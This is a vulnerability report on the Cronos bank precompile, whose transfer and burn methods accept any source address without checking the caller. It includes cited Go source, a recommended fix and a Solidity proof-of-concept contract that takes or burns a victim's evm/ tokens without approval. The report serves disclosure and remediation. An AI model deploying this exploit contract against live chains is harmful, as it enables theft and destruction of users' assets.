### Title
Bank Precompile `transfer` and `burn` Accept Arbitrary `sender`/`addr` Without Caller Authorization Check — (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The `BankContract` precompile at `0x0000000000000000000000000000000000000064` exposes `transfer(address sender, address recipient, uint256 amount)` and `burn(address addr, uint256 amount)` methods. In both cases the target address is taken directly from the ABI-decoded call arguments, and the precompile never verifies that `contract.Caller()` is authorized to act on behalf of that address. Any unprivileged EVM contract can therefore transfer or burn `evm/<itself>` native bank tokens from any account that holds them, without that account's consent.

### Finding Description

In `BankContract.Run()`, the `TransferMethodName` branch decodes `sender` from the caller-supplied ABI arguments and passes it directly as the `from` address to `bankKeeper.SendCoins`:

```go
sender := args[0].(common.Address)   // fully attacker-controlled
...
from := sdk.AccAddress(sender.Bytes())
denom := EVMDenom(contract.Caller()) // evm/<calling_contract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no guard of the form `contract.Caller() == sender` or any approval/allowance check. The same pattern applies to `BurnMethodName`: `addr` is decoded from arguments and passed to `SendCoinsFromAccountToModule` without verifying the caller has authority over that address. [2](#0-1) 

By contrast, the generic `exec` helper in `utils.go` explicitly enforces that the message signer matches `e.caller` before executing any native action — a guard that is entirely absent in `BankContract.Run()`. [3](#0-2) 

The `evm/` denom tokens are real native bank-module coins. The intended usage pattern (shown in `TestBank.sol`) is for a contract to `mint` `evm/<itself>` tokens to users as deposit receipts, and for users to later `burn` them to reclaim underlying assets. [4](#0-3) 

The precompile is registered at the fixed address `common.BytesToAddress([]byte{100})` and is reachable by any EVM contract. [5](#0-4) 

### Impact Explanation

**Critical — Unauthorized transfer and burn of precompile-controlled (`evm/` denom) native bank assets.**

A malicious contract can:
1. Lure users into holding `evm/<attacker_contract>` tokens (e.g., by acting as a legitimate token wrapper or receipt issuer).
2. At any later time, call `bank.transfer(victimAddress, attackerAddress, amount)` through the precompile to move those tokens out of the victim's account with no approval.
3. Alternatively call `bank.burn(victimAddress, amount)` to destroy the victim's tokens, voiding their claim on any underlying assets.

Because `evm/<contract>` tokens can represent real value (they are backed by assets deposited into the contract and can be transferred via IBC), this constitutes a direct, unauthorized balance change for precompile-controlled assets.

### Likelihood Explanation

The entry path requires no privilege: any deployed EVM contract can call the bank precompile. The only precondition is that the victim holds `evm/<attacker_contract>` tokens, which the attacker can engineer by deploying a contract that mints such tokens to users as part of a seemingly legitimate interaction (e.g., a staking wrapper, LP receipt, or bridge contract). The attack is therefore fully reachable by an unprivileged actor.

### Recommendation

In the `TransferMethodName` branch, require that the decoded `sender` equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

In the `BurnMethodName` branch, require that the decoded `addr` equals `contract.Caller()`:

```go
if recipient != contract.Caller() {
    return nil, errors.New("burn: can only burn from the calling contract")
}
```

This mirrors the authorization model already enforced in `utils.go`'s `exec` helper, where `caller != e.caller` is rejected before any native action is executed. [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
}

contract AttackBank {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<this> tokens to victim as part of a "legitimate" deposit
    function depositForVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
        // victim now holds evm/<this> tokens representing their deposit
    }

    // Step 2: at any time, steal victim's evm/<this> tokens — no approval needed
    function steal(address victim, address attacker, uint256 amount) external {
        // sender arg is victim, but contract.Caller() == address(this)
        // precompile does NOT check sender == contract.Caller()
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim's tokens entirely
    function destroyVictimTokens(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

After `depositForVictim(victim, 100)`, calling `steal(victim, attacker, 100)` succeeds and moves 100 `evm/<AttackBank>` tokens from `victim` to `attacker` with no signature or approval from `victim`. The bank precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, coins)` unconditionally. [7](#0-6)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L32-33)
```go
	bankContractAddress     = common.BytesToAddress([]byte{100})
	bankGasRequiredByMethod = map[[4]byte]uint64{}
```

**File:** x/cronos/keeper/precompiles/bank.go (L121-148)
```go
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
```

**File:** x/cronos/keeper/precompiles/bank.go (L175-196)
```go
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
```

**File:** x/cronos/keeper/precompiles/utils.go (L38-49)
```go
	signers, _, err := e.cdc.GetMsgV1Signers(msg)
	if err != nil {
		return nil, fmt.Errorf("fail to get signers %w", err)
	}

	if len(signers) != 1 {
		return nil, errors.New("don't support multi-signers message")
	}
	caller := common.BytesToAddress(signers[0])
	if caller != e.caller {
		return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", e.caller.Hex(), caller.Hex())
	}
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L14-38)
```text
    function moveToNative(uint256 amount) public returns (bool) {
        _burn(msg.sender, amount);
        return bank.mint(msg.sender, amount);
    }

    function moveFromNative(uint256 amount) public returns (bool) {
        bool result = bank.burn(msg.sender, amount);
        require(result, "native call");
        _mint(msg.sender, amount);
        return result;
    }

    function nativeBalanceOf(address addr) public returns (uint256) {
        return bank.balanceOf(address(this), addr);
    }

    function moveToNativeRevert(uint256 amount) public {
        moveToNative(amount);
        revert("test");
    }

    function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return bank.transfer(msg.sender, recipient, amount);
    }
```
